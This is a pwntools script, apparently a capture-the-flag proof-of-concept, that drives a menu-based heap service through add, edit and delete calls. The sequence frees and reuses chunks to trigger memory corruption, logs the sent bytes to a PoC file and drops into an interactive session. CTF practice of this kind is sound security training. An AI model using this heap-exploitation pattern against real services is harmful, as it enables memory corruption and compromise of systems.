#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#context.log_level = "debug"
#edit by wangyan aka ysyy

'''
host = "104.199.25.43"
port = 1337
'''
host = "127.0.0.1"
port = 2323
fp = open("PoC" ,'wb')


r = remote(host,port)

def p_sendline(data):
    #print data+'\n'
    fp.write(data+"\n")
    fp.flush()
    r.sendline(data)

def p_send(data):
    #print data
    fp.write(data)
    fp.flush()
    r.send(data)

def add(idx, size, data):
    p_send("0001")
    r.recvuntil("index:")
    p_send(str(idx).rjust(4, '0'))
    r.recvuntil("size:")
    p_send(str(size).rjust(4, '0'))
    r.recvuntil("data:")
    p_send(data)

def edit(idx, data):
    p_send("0002")
    r.recvuntil("index:")
    p_send(str(idx).rjust(4, '0'))
    r.recvuntil("data:")
    p_send(data)

def delete(idx):
    p_send("0003")
    r.recvuntil("index:")
    p_send(str(idx).rjust(4, '0'))

add(0, 32, 'a'*32)
add(1, 32, 'a'*32)
delete(0)
delete(1)

#add(2, 32, 'a'*32) #exp, fill hole 1
add(3, 32, 'c'*32) # should drop in 0
delete(0)
edit(3, 'd'*32)
add(4, 32, 'a'*32)
add(5, 32, 'a'*32)

fp.close()
r.interactive()
